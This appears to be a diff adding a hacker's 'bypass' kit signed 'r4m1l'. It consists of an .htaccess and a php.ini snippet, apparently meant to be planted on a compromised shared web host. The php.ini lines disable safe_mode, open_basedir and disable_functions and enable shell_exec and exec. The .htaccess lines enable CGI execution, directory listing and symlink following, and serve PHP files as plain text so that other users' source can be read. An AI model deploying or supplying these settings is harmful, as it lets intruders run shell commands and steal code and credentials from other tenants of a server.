@@ -1,0 +1,21 @@
+".htaccess": 
+
+#Bypass By r4m1l
+<DIRECTORY /..../user/..../> 
+OPTIONS Indexes ExecCGI FollowSymLinks 
+AllowOverride All 
+</DIRECTORY> 
+AddType txt .php 
+AddHandler txt .php 
+
+
+"php.ini": 
+
+#Bypass By r4m1l
+safe_mode = OFF 
+disable_functions = NONE 
+safe_mode_gid = OFF 
+open_basedir = OFF 
+register_globals = ON 
+exec = ON 
+shell_exec = ON 
